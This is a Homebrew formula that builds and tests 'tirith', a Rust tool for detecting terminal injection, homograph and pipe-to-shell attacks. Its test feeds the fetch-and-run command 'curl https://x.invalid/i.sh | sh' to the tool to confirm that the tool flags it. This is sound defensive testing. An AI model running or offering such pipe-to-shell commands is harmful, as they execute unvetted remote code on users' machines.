class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://ghfast.top/https://github.com/sheeki03/tirith/archive/refs/tags/v0.4.0.tar.gz"
  sha256 "365ed3f5ec5430f76ff90fa887a32d51e592bc90b4e7cedea15522650f78a75a"
  license "AGPL-3.0-only"
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    sha256 cellar: :any_skip_relocation, arm64_tahoe:   "93e9c0c6e2169d6439da82d27f5f9bbf7c6444a48cf5fb0e5330d93bc4950b18"
    sha256 cellar: :any_skip_relocation, arm64_sequoia: "7ab44118a940d58f3a95bb1b4fe0e001c32fed4b6766d0382c956d1088e624da"
    sha256 cellar: :any_skip_relocation, arm64_sonoma:  "5583daa0f2f500db92388d0bac4b5dfc8ce6bec36f899ceda634d42ccbfa8ce8"
    sha256 cellar: :any_skip_relocation, sonoma:        "ac5e07c69e018d6415227fb7fb9cd2f2b4b7ba56a16174c34aab26959a239257"
    sha256 cellar: :any,                 arm64_linux:   "44254e0ac9b25bcc60e33abd43d0fa9b8cee704bcd00338b62e12f43449d5ecd"
    sha256 cellar: :any,                 x86_64_linux:  "54e643d763acc4f03d10ee9d11551eb489f26376af093f57be1eb8f290be44de"
  end

  depends_on "rust" => :build

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end